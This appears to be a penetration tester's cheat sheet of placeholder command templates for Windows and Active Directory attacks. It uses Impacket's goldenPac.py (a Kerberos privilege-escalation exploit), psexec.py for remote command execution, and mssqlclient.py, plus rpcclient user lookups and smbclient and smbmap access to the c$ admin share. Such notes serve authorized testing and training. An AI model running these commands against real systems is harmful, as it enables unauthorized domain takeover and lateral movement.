mssqlclient.py -p ^PORT^ ^USER^:^PASSWORD^@^IP^  
  
  
  
goldenPac.py DOMAIN/USER:PASSWORD@HOST  
  
  
rpcclient -U ^USER^ ^HOST^  
lookupnames ^USER^  
  
  
smbclient -k -u ^USER^ \\\\^HOST^\\c$  
  
  
  
kinit -V ^USER^@^HOST^  
  
psexec.py ^DOMAIN^/^USER^:^PASSWORD^@^HOST^  
cmd line  
  
  
  
smbmap.py -u ^USER^ -p ^PASSWORD^ -H ^HOST^